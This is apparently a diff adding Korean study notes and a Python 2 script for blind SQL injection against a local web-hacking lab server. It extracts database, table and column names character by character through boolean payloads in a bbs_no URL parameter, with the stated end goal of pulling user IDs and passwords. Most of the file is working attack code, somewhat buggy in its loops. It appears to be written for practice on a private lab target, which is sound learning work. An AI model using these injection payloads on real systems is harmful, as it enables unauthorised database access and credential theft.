@@ -1,0 +1,72 @@
+http://192.168.0.193:5000
+1. 데이터베이스 길이 및 데이터베이스 명 빼오기
+2. 파이썬으로 자동화해보기 * 참거짓 구분을 코드상으로 뭘로하는가?
+                                     * 서버측응답코드(Status Code),  Content-Length 등
+                                     * 문자열 구분 등
+3. 데이터베이스 명을 통해, 테이블 명 뽑기
+substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=[DB명]), 1,1);
+substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=[DB명] limit 0,1), 1,1)
+4. 데이터베이스 명과 테이블 명을 통해, 컬럼 명 뽑기
+   ex) board 테이블: bbs_no, bbs_title ...
+        user 테이블: idx, ....
+5. 유저 테이블에 있는 아이디 패스워드 뽑기
+
+# -*- coding:utf-8 -*-
+import requests
+from bs4 import BeautifulSoup
+
+def find_db(x):    
+    for y in range(127):        
+        url = "http://192.168.0.193:5000/main/view?bbs_no=21 and ascii(substring(database(),{},1))={}".format(x,y)                
+        res=requests.get(url)
+        if res.status_code == 200 and y != 0:                      
+            print res.status_code, y, chr(y)                    
+    pass
+
+def find_tablename_size():  #테이블 몇개있는지?
+    for y in range(127):        
+        database_name = "webhacking"
+        url = "http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='{}'),1,1)={}".format(database_name, y)        
+        res=requests.get(url)        
+        if res.status_code == 200 and y != 0:                                              
+            return y
+            
+    pass
+
+def find_tablename_name(another):
+    table_name = list()
+    start_num=1
+    for x in range(1, 10):        
+        for y in range(127):        # 테이블 이름              
+            database_name = "webhacking"        
+            url = "http://192.168.0.193:5000/main/view?bbs_no=21 and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA='{}' limit {},1),{},1)='{}'".format(database_name, another, start_num, chr(y))        
+            res=requests.get(url)            
+            if res.status_code == 200:                                            
+                table_name.append(chr(y))
+                start_num+=1
+    return table_name
+
+
+
+if __name__=="__main__":
+    
+    #    find_tablename_name(x)
+    #    find_db(x)
+    res = []
+    for another_num in range(0, find_tablename_size()+1):
+        res.append(find_tablename_name(another_num))
+    res_str=""
+    
+    for y in res:
+        print y
+        res_str += y
+        print res_str
+
+    
+    #print find_tablename_size()
+    #for y in range(find_tablename_size()):
+    #    print find_tablename_size()
+    #    find_tablename_name()
+    
+    
+    
